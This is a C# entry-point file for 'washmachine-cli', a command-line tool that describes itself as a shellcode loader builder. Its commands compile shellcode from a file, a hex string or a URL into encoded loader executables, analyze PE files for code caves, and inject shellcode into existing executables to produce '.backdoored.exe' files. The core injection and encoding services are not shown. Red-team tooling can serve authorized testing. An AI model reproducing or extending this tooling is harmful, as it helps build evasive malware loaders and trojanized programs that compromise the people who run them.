using System.Globalization;
using System.Text.Json;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Testing;

namespace Washmachine.Cli;

public static class Program
{
    private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };

    public static async Task<int> Main(string[] args)
    {
        if (args.Length == 0)
        {
            PrintUsage();
            return 1;
        }

        var command = args[0].ToLowerInvariant();
        var cmdArgs = args.Skip(1).ToArray();

        return command switch
        {
            "compile"   => await RunCompileAsync(cmdArgs),
            "analyze"   => await RunAnalyzeAsync(cmdArgs),
            "backdoor"  => await RunBackdoorAsync(cmdArgs),
            "list"      => await RunListAsync(cmdArgs),
            "provision" => await RunProvisionAsync(cmdArgs),
            "test"      => await TestHarness.RunAsync(cmdArgs),
            "help" or "--help" or "-h" => PrintUsage(),
            _ => PrintUnknownCommand(command),
        };
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  compile
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunCompileAsync(string[] args)
    {
        string? shellcodeFile = null;
        string? shellcodeHex = null;
        string? shellcodeUrl = null;
        string? templateId = null;
        string? encoderIndex = null;
        string? envelopeIndex = null;
        var snippets = new Dictionary<string, string>();
        bool verbose = false;
        bool jsonOutput = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--shellcode-hex" when i + 1 < args.Length:
                    shellcodeHex = args[++i]; break;
                case "--shellcode-url" or "-u" when i + 1 < args.Length:
                    shellcodeUrl = args[++i]; break;
                case "--template" or "-t" when i + 1 < args.Length:
                    templateId = args[++i]; break;
                case "--encoder" or "-e" when i + 1 < args.Length:
                    encoderIndex = args[++i]; break;
                case "--envelope" or "-v" when i + 1 < args.Length:
                    envelopeIndex = args[++i]; break;
                case "--snippet" when i + 1 < args.Length:
                    var kv = args[++i].Split('=', 2);
                    if (kv.Length == 2) snippets[kv[0]] = kv[1];
                    break;
                case "--verbose": verbose = true; break;
                case "--json": jsonOutput = true; break;
                default:
                    Console.Error.WriteLine($"Unknown option: {args[i]}");
                    return 1;
            }
        }

        if (shellcodeFile == null && shellcodeHex == null && shellcodeUrl == null)
        {
            Console.Error.WriteLine("Error: provide --shellcode <file>, --shellcode-hex <hex>, or --shellcode-url <url>");
            return 1;
        }

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;

        var paths = new AppPaths();

        // Ensure requirements (Bin2Shell) before compilation
        var provisioner = new RequirementProvisioner(paths, logger);
        await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());

        var runner = new Bin2ShellRunner(paths);
        var snippetService = new YamlCodeSnippetCatalogService(paths);
        var toolLocator = new CompilerToolLocator(logger);
        var compiler = new CompilerService(paths, runner, snippetService, toolLocator, logger);

        // Build UiData from CLI arguments
        var textBoxes = new Dictionary<string, string>
        {
            ["shellcodeFile"] = shellcodeFile ?? "",
            ["shellcodeRAW"] = shellcodeHex ?? "",
            ["shellcodeURL"] = shellcodeUrl ?? "",
            ["shellcodeURLFile"] = "",
        };

        var comboBoxes = new Dictionary<string, string>
        {
            ["templateComboBox"] = templateId ?? "shellcode-minimal",
        };

        // Resolve encoder/envelope display text from catalog
        var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
        try
        {
            var catalog = await encodingCatalog.GetCatalogAsync();

            if (encoderIndex != null && int.TryParse(encoderIndex, out int encIdx))
            {
                var enc = catalog.Encoders.FirstOrDefault(e => e.Index == encIdx);
                comboBoxes["bin2hexEncoder"] = enc?.DisplayText ?? $"{encIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEncoder"] = "0 - none";
            }

            if (envelopeIndex != null && int.TryParse(envelopeIndex, out int envIdx))
            {
                var env = catalog.Envelopes.FirstOrDefault(e => e.Index == envIdx);
                comboBoxes["bin2hexEnvelope"] = env?.DisplayText ?? $"{envIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEnvelope"] = "0 - none";
            }
        }
        catch (Exception ex)
        {
            logger.Warn($"Could not load encoding catalog: {ex.Message}");
            comboBoxes["bin2hexEncoder"] = encoderIndex != null ? $"{encoderIndex} - custom" : "0 - none";
            comboBoxes["bin2hexEnvelope"] = envelopeIndex != null ? $"{envelopeIndex} - custom" : "0 - none";
        }

        // Apply snippet selections and defaults
        foreach (var kv in snippets)
            comboBoxes[$"snippetCombo_{kv.Key}_0"] = kv.Value;

        // Apply default snippets for the selected template
        if (snippetService.TryGetTemplate(comboBoxes["templateComboBox"], out var tmpl))
        {
            foreach (var ph in tmpl.Placeholders.Where(p => p.Kind == TemplatePlaceholderKind.Snippet))
            {
                if (!snippetService.TryResolveSection(ph.SnippetTemplateKey, out var section))
                    continue;
                string comboName = $"snippetCombo_{ph.SnippetTemplateKey}_0";
                if (!comboBoxes.ContainsKey(comboName))
                {
                    var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
                                      ?? section.Items.FirstOrDefault();
                    if (defaultItem != null)
                        comboBoxes[comboName] = defaultItem.Id;
                }
            }

            // Apply default input values
            foreach (var section in snippetService.GetAllSections())
            {
                foreach (var input in section.Inputs)
                {
                    if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(input.Id))
                        textBoxes[input.Id] = input.DefaultValue;
                }
            }
        }

        var data = new UiData(textBoxes, comboBoxes);

        try
        {
            var result = await compiler.CompileAsync(data);

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputExePath,
                    result.GeneratedSourcePath,
                    Notes = result.Notes,
                    CompilerPath = result.Discovery?.Best?.Path,
                    ConversionSuccess = result.ConversionResult.Success,
                    ConversionError = result.ConversionResult.Error,
                };
                Console.WriteLine(JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var note in result.Notes)
                    logger.Info(note);

                if (result.Success)
                {
                    logger.Ok("Compilation succeeded.");
                }
                else
                {
                    logger.Error($"Compilation failed: {result.ConversionResult.Error}");
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            logger.Error($"Fatal: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  analyze
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunAnalyzeAsync(string[] args)
    {
        if (args.Length == 0)
        {
            Console.Error.WriteLine("Usage: washmachine-cli analyze <pe-file>");
            return 1;
        }

        var peFile = args[0];
        if (!File.Exists(peFile))
        {
            Console.Error.WriteLine($"File not found: {peFile}");
            return 1;
        }

        bool jsonOutput = args.Contains("--json");
        var logger = new ConsoleLogger();
        var analyzer = new PeAnalyzerService(logger);

        try
        {
            var result = await analyzer.AnalyzeAsync(peFile);

            if (jsonOutput)
            {
                Console.WriteLine(JsonSerializer.Serialize(result, JsonPrint));
            }
            else
            {
                logger.Ok($"PE Analysis: {peFile}");
                logger.Info($"  Architecture: {result.Architecture}");
                logger.Info($"  Sections: {result.TotalSections}");
                logger.Info($"  Imports: {result.TotalImports} DLLs");

                foreach (var section in result.Sections)
                {
                    logger.Info($"  Section: {section.Name} (VSize={section.VirtualSize}, RawSize={section.RawSize}, Entropy={section.Entropy:F2})");
                }

                if (result.TotalCodeCaves > 0)
                {
                    logger.Info($"  Code caves found: {result.TotalCodeCaves}");
                    foreach (var cave in result.CodeCaves)
                    {
                        logger.Info($"    {cave.SectionName}: offset=0x{cave.FileOffset:X}, size={cave.Size}");
                    }
                }
            }

            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Analysis failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  backdoor
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunBackdoorAsync(string[] args)
    {
        string? peFile = null;
        string? shellcodeFile = null;
        string? outputFile = null;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--pe" when i + 1 < args.Length:
                    peFile = args[++i]; break;
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--output" or "-o" when i + 1 < args.Length:
                    outputFile = args[++i]; break;
            }
        }

        if (peFile == null || shellcodeFile == null)
        {
            Console.Error.WriteLine("Usage: washmachine-cli backdoor --pe <file> --shellcode <file> [--output <file>]");
            return 1;
        }

        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var service = new PeBackdoorService(paths, logger);

        try
        {
            var peInfo = await service.AnalyzePeAsync(peFile);
            logger.Ok($"PE loaded: {peFile}");
            logger.Info($"  Entry point: 0x{peInfo.EntryPoint:X}");
            logger.Info($"  Sections: {peInfo.Sections.Count}");

            var shellcode = await File.ReadAllBytesAsync(shellcodeFile);
            logger.Info($"  Shellcode size: {shellcode.Length} bytes");

            var options = new PeBackdoorOptions
            {
                TargetPePath = peFile,
                ShellcodePath = shellcodeFile,
                OutputPath = outputFile ?? Path.ChangeExtension(peFile, ".backdoored.exe"),
            };

            var result = await service.BackdoorAsync(options);

            if (result.Success)
            {
                logger.Ok($"Backdoored PE written to: {result.OutputPath}");
                return 0;
            }
            else
            {
                logger.Error($"Backdoor failed: {result.ErrorMessage}");
                return 1;
            }
        }
        catch (Exception ex)
        {
            logger.Error($"Backdoor failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  list
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunListAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();

        if (args.Length == 0)
        {
            Console.Error.WriteLine("Usage: washmachine-cli list [--templates|--encoders|--snippets|--compilers]");
            return 1;
        }

        var what = args[0].TrimStart('-').ToLowerInvariant();

        switch (what)
        {
            case "templates":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var templates = catalog.GetTemplates();
                Console.WriteLine($"Available templates ({templates.Count}):");
                foreach (var t in templates)
                    Console.WriteLine($"  {t.Id,-30} {t.Display}");
                break;
            }
            case "encoders":
            {
                var runner = new Bin2ShellRunner(paths);
                var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
                var catalog = await encodingCatalog.GetCatalogAsync();
                Console.WriteLine($"Encoders ({catalog.Encoders.Count}):");
                foreach (var e in catalog.Encoders)
                    Console.WriteLine($"  {e.Index}: {e.Name} — {e.Description}");
                Console.WriteLine($"\nEnvelopes ({catalog.Envelopes.Count}):");
                foreach (var e in catalog.Envelopes)
                    Console.WriteLine($"  {e.Index}: {e.Name} — {e.Description}");
                break;
            }
            case "snippets":
            {
                var catalog = new YamlCodeSnippetCatalogService(paths);
                var sections = catalog.GetAllSections();
                Console.WriteLine($"Snippet sections ({sections.Count}):");
                foreach (var s in sections)
                {
                    Console.WriteLine($"  {s.Header,-30} ({s.Items.Count} items)");
                    foreach (var item in s.Items)
                        Console.WriteLine($"    {item.Id,-26} {item.Display}{(item.IsDefault ? " [default]" : "")}");
                }
                break;
            }
            case "compilers":
            {
                var toolLocator = new CompilerToolLocator(logger);
                var result = await toolLocator.DiscoverAsync();
                if (result.Best != null)
                    Console.WriteLine($"Best compiler: {result.Best.Path} ({result.Best.Kind})");
                Console.WriteLine($"Candidates ({result.Candidates.Count}):");
                foreach (var c in result.Candidates)
                    Console.WriteLine($"  {c.Kind,-10} {c.Path}");
                if (result.Errors.Count > 0)
                {
                    Console.WriteLine($"Errors:");
                    foreach (var e in result.Errors)
                        Console.WriteLine($"  {e}");
                }
                break;
            }
            default:
                Console.Error.WriteLine($"Unknown list target: {what}. Use --templates, --encoders, --snippets, or --compilers.");
                return 1;
        }

        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  provision
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunProvisionAsync(string[] args)
    {
        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var provisioner = new RequirementProvisioner(paths, logger);

        try
        {
            await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());
            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Provisioning failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  help
    // ═══════════════════════════════════════════════════════════════════════

    private static int PrintUsage()
    {
        Console.WriteLine("""
        washmachine-cli — Shellcode loader builder

        Usage: washmachine-cli <command> [options]

        Commands:
          compile     Build a shellcode loader executable
          analyze     Analyze a PE file (headers, sections, imports, code caves)
          backdoor    Inject shellcode into an existing PE file
          list        List available templates, encoders, snippets, or compilers
          provision   Download and install required external tools (Bin2Shell)
          test        Run the automated test harness

        compile options:
          --shellcode, -s <file>    Path to shellcode .bin file
          --shellcode-hex <hex>     Hex-encoded shellcode string
          --shellcode-url, -u <url> URL to fetch shellcode from
          --template, -t <id>       Template ID (default: shellcode-minimal)
          --encoder, -e <index>     Bin2Shell encoder index (default: 0 = none)
          --envelope, -v <index>    Bin2Shell envelope index (default: 0 = none)
          --snippet <key=value>     Snippet selection (repeatable)
          --verbose                 Enable verbose logging
          --json                    Output results as JSON

        analyze options:
          <pe-file>                 Path to PE file to analyze
          --json                    Output results as JSON

        backdoor options:
          --pe <file>               Target PE file
          --shellcode, -s <file>    Shellcode to inject
          --output, -o <file>       Output file (default: <input>.backdoored.exe)

        list options:
          --templates               List available code templates
          --encoders                List available encoders and envelopes
          --snippets                List available snippet sections and items
          --compilers               List discovered compiler toolchains

        Examples:
          washmachine-cli compile -s payload.bin -t shellcode-minimal
          washmachine-cli compile -s payload.bin -e 1 -v 1 --json
          washmachine-cli analyze target.exe --json
          washmachine-cli list --templates
          washmachine-cli provision
        """);
        return 0;
    }

    private static int PrintUnknownCommand(string command)
    {
        Console.Error.WriteLine($"Unknown command: {command}");
        Console.Error.WriteLine("Run 'washmachine-cli help' for usage information.");
        return 1;
    }
}
